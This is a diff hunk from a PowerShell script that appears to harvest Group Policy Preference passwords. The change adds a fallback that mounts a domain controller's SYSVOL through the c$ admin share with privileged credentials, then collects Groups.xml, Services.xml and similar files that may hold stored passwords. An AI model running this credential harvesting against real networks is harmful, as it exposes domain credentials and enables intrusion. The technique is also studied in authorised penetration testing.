@@ -190,18 +190,22 @@ function Get-Stuff {
       		if ((test-path $tpath) -eq $false) {
 			New-PSDrive -Name $drv -Root "\\$ComputerName\SYSVOL" -PSProvider "FileSystem" -Credential $t1_cred  -Scope Global -Verbose | out-null
     		}
+      		if ((test-path $tpath) -eq $false) {
+			New-PSDrive -Name $drv -Root "\\$ComputerName\c$\Windows\SYSVOL\" -PSProvider "FileSystem" -Credential $t0_cred  -Scope Global -Verbose | out-null
+    		}
         }
+	
         if (test-path $tpath) {
           $XMlFiles = Get-ChildItem -Path $tpath -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
-    	    Get-PSDrive $drv | Remove-PSDrive
           if ( -not $XMlFiles ) {throw 'No preference files found.'}
 
           Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
-    
+    	  
           foreach ($File in $XMLFiles) {
             $Result = (Get-GPPIFS $File.Fullname)
             Write-Output $Result
           }
+	  Get-PSDrive $drv | Remove-PSDrive
         } else {
           Write-Verbose "Unable to mount sysvol share for some reason"
         }
